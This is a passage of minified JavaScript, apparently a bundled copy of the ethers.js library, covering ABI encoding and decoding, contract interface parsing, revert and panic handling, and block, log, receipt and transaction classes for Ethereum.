occurred",s="require(false)";else if(l.length%32!==4)i+=" (could not decode reason; invalid data length)";else if(rt(l.slice(0,4))==="0x08c379a0")try{s=r.decode(["string"],l.slice(4))[0],a={signature:"Error(string)",name:"Error",args:[s]},i+=`: ${JSON.stringify(s)}`}catch{i+=" (could not decode reason; invalid string data)"}else if(rt(l.slice(0,4))==="0x4e487b71")try{const f=Number(r.decode(["uint256"],l.slice(4))[0]);a={signature:"Panic(uint256)",name:"Panic",args:[f]},s=`Panic due to ${Wu.get(f)||"UNKNOWN"}(${f})`,i+=`: ${s}`}catch{i+=" (could not decode panic code)"}else i+=" (unknown custom error)"}const c={to:e.to?Vn(e.to):null,data:e.data||"0x"};return e.from&&(c.from=Vn(e.from)),Mr(i,"CALL_EXCEPTION",{action:t,data:n,reason:s,transaction:c,invocation:o,revert:a})}class W1{#e(e){if(e.isArray())return new wMe(this.#e(e.arrayChildren),e.arrayLength,e.name);if(e.isTuple())return new l6(e.components.map(r=>this.#e(r)),e.name);switch(e.baseType){case"address":return new yMe(e.name);case"bool":return new vMe(e.name);case"string":return new RMe(e.name);case"bytes":return new EMe(e.name);case"":return new CMe(e.name)}let n=e.type.match(tLe);if(n){let r=parseInt(n[2]||"256");return pe(r!==0&&r<=256&&r%8===0,"invalid "+n[1]+" bit length","param",e),new IMe(r/8,n[1]==="int",e.name)}if(n=e.type.match(eLe),n){let r=parseInt(n[1]);return pe(r!==0&&r<=32,"invalid bytes length","param",e),new _Me(r,e.name)}pe(!1,"invalid type","type",e.type)}getDefaultValue(e){const n=e.map(i=>this.#e(Ar.from(i)));return new l6(n,"_").defaultValue()}encode(e,n){ace(n.length,e.length,"types/values length mismatch");const r=e.map(o=>this.#e(Ar.from(o))),i=new l6(r,"_"),s=new aD;return i.encode(s,n),s.data}decode(e,n,r){const i=e.map(o=>this.#e(Ar.from(o)));return new l6(i,"_").decode(new mj(n,r,HG))}static _setDefaultMaxInflation(e){pe(typeof e=="number"&&Number.isInteger(e),"invalid defaultMaxInflation factor","value",e),HG=e}static defaultAbiCoder(){return OO==null&&(OO=new W1),OO}static getBuiltinCallException(e,n,r){return nLe(e,n,r,W1.defaultAbiCoder())}}class rLe{fragment;name;signature;topic;args;constructor(e,n,r){const i=e.name,s=e.format();Lt(this,{fragment:e,name:i,signature:s,topic:n,args:r})}}class iLe{fragment;name;args;signature;selector;value;constructor(e,n,r,i){const s=e.name,o=e.format();Lt(this,{fragment:e,name:s,args:r,signature:o,selector:n,value:i})}}class sLe{fragment;name;args;signature;selector;constructor(e,n,r){const i=e.name,s=e.format();Lt(this,{fragment:e,name:i,args:r,signature:s,selector:n})}}class zG{hash;_isIndexed;static isIndexed(e){return!!(e&&e._isIndexed)}constructor(e){Lt(this,{hash:e,_isIndexed:!0})}}const qG={0:"generic panic",1:"assert(false)",17:"arithmetic overflow",18:"division or modulo by zero",33:"enum overflow",34:"invalid encoded storage byte array accessed",49:"out-of-bounds array access; popping on an empty array",50:"out-of-bounds access of an array or bytesN",65:"out of memory",81:"uninitialized function"},VG={"0x08c379a0":{signature:"Error(string)",name:"Error",inputs:["string"],reason:t=>`reverted with reason string ${JSON.stringify(t)}`},"0x4e487b71":{signature:"Panic(uint256)",name:"Panic",inputs:["uint256"],reason:t=>{let e="unknown panic code";return t>=0&&t<=255&&qG[t.toString()]&&(e=qG[t.toString()]),`reverted with panic code 0x${t.toString(16)} (${e})`}}};class km{fragments;deploy;fallback;receive;#e;#t;#n;#r;constructor(e){let n=[];typeof e=="string"?n=JSON.parse(e):n=e,this.#n=new Map,this.#e=new Map,this.#t=new Map;const r=[];for(const o of n)try{r.push(Ng.from(o))}catch(a){console.log(`[Warning] Invalid Fragment ${JSON.stringify(o)}:`,a.message)}Lt(this,{fragments:Object.freeze(r)});let i=null,s=!1;this.#r=this.getAbiCoder(),this.fragments.forEach((o,a)=>{let c;switch(o.type){case"constructor":if(this.deploy){console.log("duplicate definition - constructor");return}Lt(this,{deploy:o});return;case"fallback":o.inputs.length===0?s=!0:(pe(!i||o.payable!==i.payable,"conflicting fallback fragments",`fragments[${a}]`,o),i=o,s=i.payable);return;case"function":c=this.#n;break;case"event":c=this.#t;break;case"error":c=this.#e;break;default:return}const l=o.format();c.has(l)||c.set(l,o)}),this.deploy||Lt(this,{deploy:vf.from("constructor()")}),Lt(this,{fallback:i,receive:s})}format(e){const n=e?"minimal":"full";return this.fragments.map(i=>i.format(n))}formatJson(){const e=this.fragments.map(n=>n.format("json"));return JSON.stringify(e.map(n=>JSON.parse(n)))}getAbiCoder(){return W1.defaultAbiCoder()}#i(e,n,r){if(gr(e)){const s=e.toLowerCase();for(const o of this.#n.values())if(s===o.selector)return o;return null}if(e.indexOf("(")===-1){const s=[];for(const[o,a]of this.#n)o.split("(")[0]===e&&s.push(a);if(n){const o=n.length>0?n[n.length-1]:null;let a=n.length,c=!0;ai.isTyped(o)&&o.type==="overrides"&&(c=!1,a--);for(let l=s.length-1;l>=0;l--){const f=s[l].inputs.length;f!==a&&(!c||f!==a-1)&&s.splice(l,1)}for(let l=s.length-1;l>=0;l--){const f=s[l].inputs;for(let h=0;h<n.length;h++)if(ai.isTyped(n[h])){if(h>=f.length){if(n[h].type==="overrides")continue;s.splice(l,1);break}if(n[h].type!==f[h].baseType){s.splice(l,1);break}}}}if(s.length===1&&n&&n.length!==s[0].inputs.length){const o=n[n.length-1];(o==null||Array.isArray(o)||typeof o!="object")&&s.splice(0,1)}if(s.length===0)return null;if(s.length>1&&r){const o=s.map(a=>JSON.stringify(a.format())).join(", ");pe(!1,`ambiguous function description (i.e. matches ${o})`,"key",e)}return s[0]}const i=this.#n.get(Dl.from(e).format());return i||null}getFunctionName(e){const n=this.#i(e,null,!1);return pe(n,"no matching function","key",e),n.name}hasFunction(e){return!!this.#i(e,null,!1)}getFunction(e,n){return this.#i(e,n||null,!0)}forEachFunction(e){const n=Array.from(this.#n.keys());n.sort((r,i)=>r.localeCompare(i));for(let r=0;r<n.length;r++){const i=n[r];e(this.#n.get(i),r)}}#o(e,n,r){if(gr(e)){const s=e.toLowerCase();for(const o of this.#t.values())if(s===o.topicHash)return o;return null}if(e.indexOf("(")===-1){const s=[];for(const[o,a]of this.#t)o.split("(")[0]===e&&s.push(a);if(n){for(let o=s.length-1;o>=0;o--)s[o].inputs.length<n.length&&s.splice(o,1);for(let o=s.length-1;o>=0;o--){const a=s[o].inputs;for(let c=0;c<n.length;c++)if(ai.isTyped(n[c])&&n[c].type!==a[c].baseType){s.splice(o,1);break}}}if(s.length===0)return null;if(s.length>1&&r){const o=s.map(a=>JSON.stringify(a.format())).join(", ");pe(!1,`ambiguous event description (i.e. matches ${o})`,"key",e)}return s[0]}const i=this.#t.get(kl.from(e).format());return i||null}getEventName(e){const n=this.#o(e,null,!1);return pe(n,"no matching event","key",e),n.name}hasEvent(e){return!!this.#o(e,null,!1)}getEvent(e,n){return this.#o(e,n||null,!0)}forEachEvent(e){const n=Array.from(this.#t.keys());n.sort((r,i)=>r.localeCompare(i));for(let r=0;r<n.length;r++){const i=n[r];e(this.#t.get(i),r)}}getError(e,n){if(gr(e)){const i=e.toLowerCase();if(VG[i])return Jo.from(VG[i].signature);for(const s of this.#e.values())if(i===s.selector)return s;return null}if(e.indexOf("(")===-1){const i=[];for(const[s,o]of this.#e)s.split("(")[0]===e&&i.push(o);if(i.length===0)return e==="Error"?Jo.from("error Error(string)"):e==="Panic"?Jo.from("error Panic(uint256)"):null;if(i.length>1){const s=i.map(o=>JSON.stringify(o.format())).join(", ");pe(!1,`ambiguous error description (i.e. ${s})`,"name",e)}return i[0]}if(e=Jo.from(e).format(),e==="Error(string)")return Jo.from("error Error(string)");if(e==="Panic(uint256)")return Jo.from("error Panic(uint256)");const r=this.#e.get(e);return r||null}forEachError(e){const n=Array.from(this.#e.keys());n.sort((r,i)=>r.localeCompare(i));for(let r=0;r<n.length;r++){const i=n[r];e(this.#e.get(i),r)}}_decodeParams(e,n){return this.#r.decode(e,n)}_encodeParams(e,n){return this.#r.encode(e,n)}encodeDeploy(e){return this._encodeParams(this.deploy.inputs,e||[])}decodeErrorResult(e,n){if(typeof e=="string"){const r=this.getError(e);pe(r,"unknown error","fragment",e),e=r}return pe(si(n,0,4)===e.selector,`data signature does not match error ${e.name}.`,"data",n),this._decodeParams(e.inputs,si(n,4))}encodeErrorResult(e,n){if(typeof e=="string"){const r=this.getError(e);pe(r,"unknown error","fragment",e),e=r}return Lr([e.selector,this._encodeParams(e.inputs,n||[])])}decodeFunctionData(e,n){if(typeof e=="string"){const r=this.getFunction(e);pe(r,"unknown function","fragment",e),e=r}return pe(si(n,0,4)===e.selector,`data signature does not match function ${e.name}.`,"data",n),this._decodeParams(e.inputs,si(n,4))}encodeFunctionData(e,n){if(typeof e=="string"){const r=this.getFunction(e);pe(r,"unknown function","fragment",e),e=r}return Lr([e.selector,this._encodeParams(e.inputs,n||[])])}decodeFunctionResult(e,n){if(typeof e=="string"){const s=this.getFunction(e);pe(s,"unknown function","fragment",e),e=s}let r="invalid length for result data";const i=po(n);if(i.length%32===0)try{return this.#r.decode(e.outputs,i)}catch{r="could not decode result data"}qe(!1,r,"BAD_DATA",{value:rt(i),info:{method:e.name,signature:e.format()}})}makeError(e,n){const r=an(e,"data"),i=W1.getBuiltinCallException("call",n,r);if(i.message.startsWith("execution reverted (unknown custom error)")){const a=rt(r.slice(0,4)),c=this.getError(a);if(c)try{const l=this.#r.decode(c.inputs,r.slice(4));i.revert={name:c.name,signature:c.format(),args:l},i.reason=i.revert.signature,i.message=`execution reverted: ${i.reason}`}catch{i.message="execution reverted (coult not decode custom error)"}}const o=this.parseTransaction(n);return o&&(i.invocation={method:o.name,signature:o.signature,args:o.args}),i}encodeFunctionResult(e,n){if(typeof e=="string"){const r=this.getFunction(e);pe(r,"unknown function","fragment",e),e=r}return rt(this.#r.encode(e.outputs,n||[]))}encodeFilterTopics(e,n){if(typeof e=="string"){const s=this.getEvent(e);pe(s,"unknown event","eventFragment",e),e=s}qe(n.length<=e.inputs.length,`too many arguments for ${e.format()}`,"UNEXPECTED_ARGUMENT",{count:n.length,expectedCount:e.inputs.length});const r=[];e.anonymous||r.push(e.topicHash);const i=(s,o)=>s.type==="string"?Rg(o):s.type==="bytes"?Oi(rt(o)):(s.type==="bool"&&typeof o=="boolean"?o=o?"0x01":"0x00":s.type.match(/^u?int/)?o=Lp(o):s.type.match(/^bytes/)?o=wBe(o,32):s.type==="address"&&this.#r.encode(["address"],[o]),Ff(rt(o),32));for(n.forEach((s,o)=>{const a=e.inputs[o];if(!a.indexed){pe(s==null,"cannot filter non-indexed parameters; must be null","contract."+a.name,s);return}s==null?r.push(null):a.baseType==="array"||a.baseType==="tuple"?pe(!1,"filtering with tuples or arrays not supported","contract."+a.name,s):Array.isArray(s)?r.push(s.map(c=>i(a,c))):r.push(i(a,s))});r.length&&r[r.length-1]===null;)r.pop();return r}encodeEventLog(e,n){if(typeof e=="string"){const o=this.getEvent(e);pe(o,"unknown event","eventFragment",e),e=o}const r=[],i=[],s=[];return e.anonymous||r.push(e.topicHash),pe(n.length===e.inputs.length,"event arguments/values mismatch","values",n),e.inputs.forEach((o,a)=>{const c=n[a];if(o.indexed)if(o.type==="string")r.push(Rg(c));else if(o.type==="bytes")r.push(Oi(c));else{if(o.baseType==="tuple"||o.baseType==="array")throw new Error("not implemented");r.push(this.#r.encode([o.type],[c]))}else i.push(o),s.push(c)}),{data:this.#r.encode(i,s),topics:r}}decodeEventLog(e,n,r){if(typeof e=="string"){const b=this.getEvent(e);pe(b,"unknown event","eventFragment",e),e=b}if(r!=null&&!e.anonymous){const b=e.topicHash;pe(gr(r[0],32)&&r[0].toLowerCase()===b,"fragment/topic mismatch","topics[0]",r[0]),r=r.slice(1)}const i=[],s=[],o=[];e.inputs.forEach((b,w)=>{b.indexed?b.type==="string"||b.type==="bytes"||b.baseType==="tuple"||b.baseType==="array"?(i.push(Ar.from({type:"bytes32",name:b.name})),o.push(!0)):(i.push(b),o.push(!1)):(s.push(b),o.push(!1))});const a=r!=null?this.#r.decode(i,Lr(r)):null,c=this.#r.decode(s,n,!0),l=[],f=[];let h=0,m=0;return e.inputs.forEach((b,w)=>{let y=null;if(b.indexed)if(a==null)y=new zG(null);else if(o[w])y=new zG(a[m++]);else try{y=a[m++]}catch(E){y=E}else try{y=c[h++]}catch(E){y=E}l.push(y),f.push(b.name||null)}),wf.fromItems(l,f)}parseTransaction(e){const n=an(e.data,"tx.data"),r=wt(e.value!=null?e.value:0,"tx.value"),i=this.getFunction(rt(n.slice(0,4)));if(!i)return null;const s=this.#r.decode(i.inputs,n.slice(4));return new iLe(i,i.selector,s,r)}parseCallResult(e){throw new Error("@TODO")}parseLog(e){const n=this.getEvent(e.topics[0]);return!n||n.anonymous?null:new rLe(n,n.topicHash,this.decodeEventLog(n,e.data,e.topics))}parseError(e){const n=rt(e),r=this.getError(si(n,0,4));if(!r)return null;const i=this.#r.decode(r.inputs,si(n,4));return new sLe(r,r.selector,i)}static from(e){return e instanceof km?e:typeof e=="string"?new km(JSON.parse(e)):typeof e.formatJson=="function"?new km(e.formatJson()):typeof e.format=="function"?new km(e.format("json")):new km(e)}}const Due=BigInt(0);function u1(t){return t??null}function mi(t){return t==null?null:t.toString()}class WG{gasPrice;maxFeePerGas;maxPriorityFeePerGas;constructor(e,n,r){Lt(this,{gasPrice:u1(e),maxFeePerGas:u1(n),maxPriorityFeePerGas:u1(r)})}toJSON(){const{gasPrice:e,maxFeePerGas:n,maxPriorityFeePerGas:r}=this;return{_type:"FeeData",gasPrice:mi(e),maxFeePerGas:mi(n),maxPriorityFeePerGas:mi(r)}}}function yI(t){const e={};t.to&&(e.to=t.to),t.from&&(e.from=t.from),t.data&&(e.data=rt(t.data));const n="chainId,gasLimit,gasPrice,maxFeePerBlobGas,maxFeePerGas,maxPriorityFeePerGas,value".split(/,/);for(const i of n)!(i in t)||t[i]==null||(e[i]=wt(t[i],`request.${i}`));const r="type,nonce".split(/,/);for(const i of r)!(i in t)||t[i]==null||(e[i]=Qt(t[i],`request.${i}`));return t.accessList&&(e.accessList=ty(t.accessList)),t.authorizationList&&(e.authorizationList=t.authorizationList.slice()),"blockTag"in t&&(e.blockTag=t.blockTag),"enableCcipRead"in t&&(e.enableCcipRead=!!t.enableCcipRead),"customData"in t&&(e.customData=t.customData),"blobVersionedHashes"in t&&t.blobVersionedHashes&&(e.blobVersionedHashes=t.blobVersionedHashes.slice()),"kzg"in t&&(e.kzg=t.kzg),"blobWrapperVersion"in t&&(e.blobWrapperVersion=t.blobWrapperVersion),"blobs"in t&&t.blobs&&(e.blobs=t.blobs.map(i=>hj(i)?rt(i):Object.assign({},i))),e}class oLe{provider;number;hash;timestamp;parentHash;parentBeaconBlockRoot;nonce;difficulty;gasLimit;gasUsed;stateRoot;receiptsRoot;blobGasUsed;excessBlobGas;miner;prevRandao;extraData;baseFeePerGas;#e;constructor(e,n){this.#e=e.transactions.map(r=>typeof r!="string"?new PA(r,n):r),Lt(this,{provider:n,hash:u1(e.hash),number:e.number,timestamp:e.timestamp,parentHash:e.parentHash,parentBeaconBlockRoot:e.parentBeaconBlockRoot,nonce:e.nonce,difficulty:e.difficulty,gasLimit:e.gasLimit,gasUsed:e.gasUsed,blobGasUsed:e.blobGasUsed,excessBlobGas:e.excessBlobGas,miner:e.miner,prevRandao:u1(e.prevRandao),extraData:e.extraData,baseFeePerGas:u1(e.baseFeePerGas),stateRoot:e.stateRoot,receiptsRoot:e.receiptsRoot})}get transactions(){return this.#e.map(e=>typeof e=="string"?e:e.hash)}get prefetchedTransactions(){const e=this.#e.slice();return e.length===0?[]:(qe(typeof e[0]=="object","transactions were not prefetched with block request","UNSUPPORTED_OPERATION",{operation:"transactionResponses()"}),e)}toJSON(){const{baseFeePerGas:e,difficulty:n,extraData:r,gasLimit:i,gasUsed:s,hash:o,miner:a,prevRandao:c,nonce:l,number:f,parentHash:h,parentBeaconBlockRoot:m,stateRoot:b,receiptsRoot:w,timestamp:y,transactions:E}=this;return{_type:"Block",baseFeePerGas:mi(e),difficulty:mi(n),extraData:r,gasLimit:mi(i),gasUsed:mi(s),blobGasUsed:mi(this.blobGasUsed),excessBlobGas:mi(this.excessBlobGas),hash:o,miner:a,prevRandao:c,nonce:l,number:f,parentHash:h,timestamp:y,parentBeaconBlockRoot:m,stateRoot:b,receiptsRoot:w,transactions:E}}[Symbol.iterator](){let e=0;const n=this.transactions;return{next:()=>e<this.length?{value:n[e++],done:!1}:{value:void 0,done:!0}}}get length(){return this.#e.length}get date(){return this.timestamp==null?null:new Date(this.timestamp*1e3)}async getTransaction(e){let n;if(typeof e=="number")n=this.#e[e];else{const r=e.toLowerCase();for(const i of this.#e)if(typeof i=="string"){if(i!==r)continue;n=i;break}else{if(i.hash!==r)continue;n=i;break}}if(n==null)throw new Error("no such tx");return typeof n=="string"?await this.provider.getTransaction(n):n}getPrefetchedTransaction(e){const n=this.prefetchedTransactions;if(typeof e=="number")return n[e];e=e.toLowerCase();for(const r of n)if(r.hash===e)return r;pe(!1,"no matching transaction","indexOrHash",e)}isMined(){return!!this.hash}isLondon(){return!!this.baseFeePerGas}orphanedEvent(){if(!this.isMined())throw new Error("");return aLe(this)}}class RA{provider;transactionHash;blockHash;blockNumber;removed;address;data;topics;index;transactionIndex;constructor(e,n){this.provider=n;const r=Object.freeze(e.topics.slice());Lt(this,{transactionHash:e.transactionHash,blockHash:e.blockHash,blockNumber:e.blockNumber,removed:e.removed,address:e.address,data:e.data,topics:r,index:e.index,transactionIndex:e.transactionIndex})}toJSON(){const{address:e,blockHash:n,blockNumber:r,data:i,index:s,removed:o,topics:a,transactionHash:c,transactionIndex:l}=this;return{_type:"log",address:e,blockHash:n,blockNumber:r,data:i,index:s,removed:o,topics:a,transactionHash:c,transactionIndex:l}}async getBlock(){const e=await this.provider.getBlock(this.blockHash);return qe(!!e,"failed to find transaction","UNKNOWN_ERROR",{}),e}async getTransaction(){const e=await this.provider.getTransaction(this.transactionHash);return qe(!!e,"failed to find transaction","UNKNOWN_ERROR",{}),e}async getTransactionReceipt(){const e=await this.provider.getTransactionReceipt(this.transactionHash);return qe(!!e,"failed to find transaction receipt","UNKNOWN_ERROR",{}),e}removedEvent(){return cLe(this)}}class Bue{provider;to;from;contractAddress;hash;index;blockHash;blockNumber;logsBloom;gasUsed;blobGasUsed;cumulativeGasUsed;gasPrice;blobGasPrice;type;status;root;#e;constructor(e,n){this.#e=Object.freeze(e.logs.map(i=>new RA(i,n)));let r=Due;e.effectiveGasPrice!=null?r=e.effectiveGasPrice:e.gasPrice!=null&&(r=e.gasPrice),Lt(this,{provider:n,to:e.to,from:e.from,contractAddress:e.contractAddress,hash:e.hash,index:e.index,blockHash:e.blockHash,blockNumber:e.blockNumber,logsBloom:e.logsBloom,gasUsed:e.gasUsed,cumulativeGasUsed:e.cumulativeGasUsed,blobGasUsed:e.blobGasUsed,gasPrice:r,blobGasPrice:e.blobGasPrice,type:e.type,status:e.status,root:e.root})}get logs(){return this.#e}toJSON(){const{to:e,from:n,contractAddress:r,hash:i,index:s,blockHash:o,blockNumber:a,logsBloom:c,logs:l,status:f,root:h}=this;return{_type:"TransactionReceipt",blockHash:o,blockNumber:a,contractAddress:r,cumulativeGasUsed:mi(this.cumulativeGasUsed),from:n,gasPrice:mi(this.gasPrice),blobGasUsed:mi(this.blobGasUsed),blobGasPrice:mi(this.blobGasPrice),gasUsed:mi(this.gasUsed),hash:i,index:s,logs:l,logsBloom:c,root:h,status:f,to:e}}get length(){return this.logs.length}[Symbol.iterator](){let e=0;return{next:()=>e<this.length?{value:this.logs[e++],done:!1}:{value:void 0,done:!0}}}get fee(){return this.gasUsed*this.gasPrice}async getBlock(){const e=await this.provider.getBlock(this.blockHash);if(e==null)throw new Error("TODO");return e}async getTransaction(){const e=await this.provider.getTransaction(this.hash);if(e==null)throw new Error("TODO");return e}async getResult(){return await this.provider.getTransactionResult(this.hash)}async confirmations(){return await this.provider.getBlockNumber()-this.blockNumber+1}removedEvent(){return Mue(this)}reorderedEvent(e){return qe(!e||e.isMined(),"unmined 'other' transction cannot be orphaned","UNSUPPORTED_OPERATION",{operation:"reorderedEvent(other)"}),jue(this,e)}}class PA{provider;blockNumber;blockHash;index;hash;type;to;from;nonce;gasLimit;gasPrice;maxPriorityFeePerGas;maxFeePerGas;maxFeePerBlobGas;data;value;chainId;signature;accessList;blobVersionedHashes;authorizationList;#e;constructor(e,n){this.provider=n,this.blockNumber=e.blockNumber!=null?e.blockNumber:null,this.blockHash=e.blockHash!=null?e.blockHash:null,this.hash=e.hash,this.index=e.index,this.type=e.type,this.from=e.from,this.to=e.to||null,this.gasLimit=e.gasLimit,this.nonce=e.nonce,this.data=e.data,this.value=e.value,this.gasPrice=e.gasPrice,this.maxPriorityFeePerGas=e.maxPriorityFeePerGas!=null?e.maxPriorityFeePerGas:null,this.maxFeePerGas=e.maxFeePerGas!=null?e.maxFeePerGas:null,this.maxFeePerBlobGas=e.maxFeePerBlobGas!=null?e.maxFeePerBlobGas:null,this.chainId=e.chainId,this.signature=e.signature,this.accessList=e.accessList!=null?e.accessList:null,this.blobVersionedHashes=e.blobVersionedHashes!=null?e.blobVersionedHashes:null,this.authorizationList=e.authorizationList!=null?e.authorizationList:null,this.#e=-1}toJSON(){const{blockNumber:e,blockHash:n,index:r,hash:i,type:s,to:o,from:a,nonce:c,data:l,signature:f,accessList:h,blobVersionedHashes:m}=this;return{_type:"TransactionResponse",accessList:h,blockNumber:e,blockHash:n,blobVersionedHashes:m,chainId:mi(this.chainId),data:l,from:a,gasLimit:mi(this.gasLimit),gasPrice:mi(this.gasPrice),hash:i,maxFeePerGas:mi(this.maxFeePerGas),maxPriorityFeePerGas:mi(this.maxPriorityFeePerGas),maxFeePerBlobGas:mi(this.maxFeePerBlobGas),nonce:c,signature:f,to:o,index:r,type:s,value:mi(this.value)}}async getBlock(){let e=this.blockNumber;if(e==null){const r=await this.getTransaction();r&&(e=r.blockNumber)}if(e==null)return null;const n=this.provider.getBlock(e);if(n==null)throw new Error("TODO");return n}async getTransaction(){return this.provider.getTransaction(this.hash)}async confirmations(){if(this.blockNumber==null){const{tx:n,blockNumber:r}=await ho({tx:this.getTransaction(),blockNumber:this.provider.getBlockNumber()});return n==null||n.blockNumber==null?0:r-n.blockNumber+1}return await this.provider.getBlockNumber()-this.blockNumber+1}async wait(e,n){const r=e??1,i=n??0;let s=this.#e,o=-1,a=s===-1;const c=async()=>{if(a)return null;const{blockNumber:m,nonce:b}=await ho({blockNumber:this.provider.getBlockNumber(),nonce:this.provider.getTransactionCount(this.from)});if(b<this.nonce){s=m;return}if(a)return null;const w=await this.getTransaction();if(!(w&&w.blockNumber!=null))for(o===-1&&(o=s-3,o<this.#e&&(o=this.#e));o<=m;){if(a)return null;const y=await this.provider.getBlock(o,!0);if(y==null)return;for(const E of y)if(E===this.hash)return;for(let E=0;E<y.length;E++){const A=await y.getTransaction(E);if(A.from===this.from&&A.nonce===this.nonce){if(a)return null;const R=await this.provider.getTransactionReceipt(A.hash);if(R==null||m-R.blockNumber+1<r)return;let S="replaced";A.data===this.data&&A.to===this.to&&A.value===this.value?S="repriced":A.data==="0x"&&A.from===A.to&&A.value===Due&&(S="cancelled"),qe(!1,"transaction was replaced","TRANSACTION_REPLACED",{cancelled:S==="replaced"||S==="cancelled",reason:S,replacement:A.replaceableTransaction(s),hash:A.hash,receipt:R})}}o++}},l=m=>{if(m==null||m.status!==0)return m;qe(!1,"transaction execution reverted","CALL_EXCEPTION",{action:"sendTransaction",data:null,reason:null,invocation:null,revert:null,transaction:{to:m.to,from:m.from,data:""},receipt:m})},f=await this.provider.getTransactionReceipt(this.hash);if(r===0)return l(f);if(f){if(r===1||await f.confirmations()>=r)return l(f)}else if(await c(),r===0)return null;return await new Promise((m,b)=>{const w=[],y=()=>{w.forEach(A=>A())};if(w.push(()=>{a=!0}),i>0){const A=setTimeout(()=>{y(),b(Mr("wait for transaction timeout","TIMEOUT"))},i);w.push(()=>{clearTimeout(A)})}const E=async A=>{if(await A.confirmations()>=r){y();try{m(l(A))}catch(R){b(R)}}};if(w.push(()=>{this.provider.off(this.hash,E)}),this.provider.on(this.hash,E),s>=0){const A=async()=>{try{await c()}catch(R){if(Ss(R,"TRANSACTION_REPLACED")){y(),b(R);return}}a||this.provider.once("block",A)};w.push(()=>{this.provider.off("block",A)}),this.provider.once("block",A)}})}isMined(){return this.blockHash!=null}isLegacy(){return this.type===0}isBerlin(){return this.type===1}isLondon(){return this.type===2}isCancun(){return this.type===3}removedEvent(){return qe(this.isMined(),"unmined transaction canot be orphaned","UNSUPPORTED_OPERATION",{operation:"removeEvent()"}),Mue(this)}reorderedEvent(e){return qe(this.isMined(),"unmined transaction canot be orphaned","UNSUPPORTED_OPERATION",{operation:"removeEvent()"}),qe(!e||e.isMined(),"unmined 'other' transaction canot be orphaned","UNSUPPORTED_OPERATION",{operation:"removeEvent()"}),jue(this,e)}replaceableTransaction(e){pe(Number.isInteger(e)&&e>=0,"invalid startBlock","startBlock",e);const n=new PA(this,this.provider);return n.#e=e,n}}function aLe(t){return{orphan:"drop-block",hash:t.hash,number:t.number}}function jue(t,e){return{orphan:"reorder-transaction",tx:t,other:e}}function Mue(t){return{orphan:"drop-transaction",tx:t}}function cLe(t){return{orphan:"drop-log",log:{transactionHash:t.transactionHash,blockHash:t.blockHash,blockNumber:t.blockNumber,address:t.address,data:t.data,topics:Object.freeze(t.topics.slice()),index:t.index}}}class Ij extends RA{interface;fragment;args;constructor(e,n,r){super(e,e.provider);const i=n.decodeEventLog(r,e.data,e.topics);Lt(this,{args:i,fragment:r,interface:n})}get eventName(){return this.fragment.name}get eventSignature(){return this.fragment.format()}}class Uue extends RA{error;constructor(e,n){super(e,e.provider),Lt(this,{error:n})}}class uLe extends Bue{#e;constructor(e,n,r){super(r,n),this.#e=e}get logs(){return super.logs.map(e=>{const n=e.topics.length?this.#e.getEvent(e.topics[0]):null;if(n)try{return new Ij(e,this.#e,n)}catch(r){return new Uue(e,r)}return e})}}class Rj extends PA{#e;constructor(e,n,r){super(r,n),this.#e=e}async wait(e,n){const r=await super.wait(e,n);return r==null?null:new uLe(this.#e,this.provider,r)}}class Lue extends dce{log;constructor(e,n,r,i){super(e,n,r),Lt(this,{log:i})}async getBlock(){return await this.log.getBlock()}async getTransaction(){return await this.log.getTransaction()}async getTransactionReceipt(){return await this.log.getTransactionReceipt()}}class lLe extends Lue{constructor(e,n,r,i,s){super(e,n,r,new Ij(s,e.interface,i));const o=e.interface.decodeEventLog(i,this.log.data,this.log.topics);Lt(this,{args:o,fragment:i})}get eventName(){return this.fragment.name}get eventSignature(){return this.fragment.format()}}const GG=BigInt(0);function Fue(t){return t&&typeof t.call=="function"}function $ue(t){return t&&typeof t.estimateGas=="function"}function N8(t){return t&&typeof t.resolveName=="function"}function Hue(t){return t&&typeof t.sendTransaction=="function"}function zue(t){if(t!=null){if(N8(t))return t;if(t.provider)return t.provider}}class dLe{#e;fragment;constructor(e,n,r){if(Lt(this,{fragment:n}),n.inputs.length<r.length)throw new Error("too many arguments");const i=Og(e.runner,"resolveName"),s=N8(i)?i:null;this.#e=(async function(){const o=await Promise.all(n.inputs.map((a,c)=>r[c]==null?null:a.walkAsync(r[c],(f,h)=>f==="address"?Array.isArray(h)?Promise.all(h.map(m=>go(m,s))):go(h,s):h)));return e.interface.encodeFilterTopics(n,o)})()}getTopicFilter(){return this.#e}}function Og(t,e){return t==null?null:typeof t[e]=="function"?t:t.provider&&typeof t.provider[e]=="function"?t.provider:null}function Vm(t){return t==null?null:t.provider||null}async function que(t,e){const n=ai.dereference(t,"overrides");pe(typeof n=="object","invalid overrides parameter","overrides",t);const r=yI(n);return pe(r.to==null||(e||[]).indexOf("to")>=0,"cannot override to","overrides.to",r.to),pe(r.data==null||(e||[]).indexOf("data")>=0,"cannot override data","overrides.data",r.data),r.from&&(r.from=r.from),r}async function fLe(t,e,n){const r=Og(t,"resolveName"),i=N8(r)?r:null;return await Promise.all(e.map((s,o)=>s.walkAsync(n[o],(a,c)=>(c=ai.dereference(c,a),a==="address"?go(c,i):c))))}function hLe(t){const e=async function(o){const a=await que(o,["data"]);a.to=await t.getAddress(),a.from&&(a.from=await go(a.from,zue(t.runner)));const c=t.interface,l=wt(a.value||GG,"overrides.value")===GG,f=(a.data||"0x")==="0x";c.fallback&&!c.fallback.payable&&c.receive&&!f&&!l&&pe(!1,"cannot send data to receive or send value to non-payable fallback","overrides",o),pe(c.fallback||f,"cannot send data to receive-only contract","overrides.data",a.data);const h=c.receive||c.fallback&&c.fallback.payable;return pe(h||l,"cannot send value to non-payable fallback","overrides.value",a.value),pe(c.fallback||f,"cannot send data to receive-only contract","overrides.data",a.data),a},n=async function(o){const a=Og(t.runner,"call");qe(Fue(a),"contract runner does not support calling","UNSUPPORTED_OPERATION",{operation:"call"});const c=await e(o);try{return await a.call(c)}catch(l){throw fj(l)&&l.data?t.interface.makeError(l.data,c):l}},r=async function(o){const a=t.runner;qe(Hue(a),"contract runner does not support sending transactions","UNSUPPORTED_OPERATION",{operation:"sendTransaction"});const c=await a.sendTransaction(await e(o)),l=Vm(t.runner);return new Rj(t.interface,l,c)},i=async function(o){const a=Og(t.runner,"estimateGas");return qe($ue(a),"contract runner does not support gas estimation","UNSUPPORTED_OPERATION",{operation:"estimateGas"}),await a.estimateGas(await e(o))},s=async o=>await r(o);return Lt(s,{_contract:t,estimateGas:i,populateTransaction:e,send:r,staticCall:n}),s}function pLe(t,e){const n=function(...l){const f=t.interface.getFunction(e,l);return qe(f,"no matching 